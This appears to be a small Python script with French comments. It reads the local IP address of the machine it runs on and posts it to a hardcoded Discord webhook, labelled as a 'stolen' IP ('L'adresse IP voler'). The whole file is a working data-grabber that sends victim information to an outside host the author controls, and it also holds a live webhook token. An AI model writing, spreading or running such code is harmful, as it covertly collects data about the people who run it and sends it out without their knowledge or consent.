import requests
import socket

def get_local_ip():
    """Récupère l'adresse IP locale."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Erreur lors de la récupération de l'IP locale: {e}")
        return None

def send_to_discord(webhook_url, ip_address):
    """Envoie l'adresse IP au webhook Discord."""
    if not ip_address:
        print("Aucune IP à envoyer.")
        return

    data = {
        "content": f"L'adresse IP voler: {ip_address}"
    }

    try:
        response = requests.post(webhook_url, json=data)
        response.raise_for_status()
        print("Adresse IP envoyée avec succès à Discord.")
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de l'envoi à Discord: {e}")

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1321941774494859275/ba72MNa8_kKAQrf07cueADyK8k9Ca8fNcDqRarAf16ATl33skpnha43bVqP41yweWUE6"
    local_ip = get_local_ip()
    send_to_discord(webhook_url, local_ip)
